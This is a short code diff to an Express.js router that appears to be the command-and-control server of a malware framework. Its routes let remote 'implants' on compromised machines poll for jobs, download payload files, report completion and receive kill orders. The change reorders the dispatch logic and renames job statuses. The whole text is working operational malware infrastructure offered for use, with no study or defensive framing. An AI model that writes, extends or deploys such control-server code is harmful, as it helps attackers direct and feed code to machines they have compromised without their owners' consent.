@@ -46,25 +46,23 @@ router.get("/ping/:slaveId", (req, res) => {
     
     // Keep up track of active implants.
     const job = databaseHelper.getJobForSlave(req.params.slaveId);
-    if (!job) {
-        res.json({code: responseHelper.PONG}) // No jobs at the moment.
+    if (job) {
+        // Send job details.
+        res.json({code: responseHelper.NEW_OBJECT, id: job.id, size: job.objectSize})
         return;
     }
 
     // Check if active implant has jobs running we want to kill.
     const killList = databaseHelper.getKillList(req.params.slaveId);
     if (killList.length > 0) {
-
-        // Once per time.
-        console.log("Killing job " + killList[0].jobId)
-
+        
+        // Once per time.        
         databaseHelper.killJob(killList[0].jobId)
         res.json({code: responseHelper.KILL_JOB, jobId: killList[0].jobId})
         return;
     }
-
-    // Send job details.
-    res.json({code: responseHelper.NEW_OBJECT, id: job.id, size: job.objectSize})
+    
+    res.json({code: responseHelper.PONG}) // No jobs at the moment.
 })
 
 router.get("/job/:jobId", (req, res) => {
@@ -78,14 +76,14 @@ router.get("/job/:jobId", (req, res) => {
         return;
     }
 
-    databaseHelper.setJobStatus(req.params.jobId, "Executing");
+    databaseHelper.setJobStatus(req.params.jobId, "RUNNING");
     res.download(job.location);
 })
 
 router.post("/job/:jobId", (req, res) => {
     
     // Mark job as done.    
-    databaseHelper.setJobStatus(req.params.jobId, "Finished", req.body.code, true);
+    databaseHelper.setJobStatus(req.params.jobId, "FINISHED", req.body.code, true);
 
     res.json({code: responseHelper.LOITER})
 })
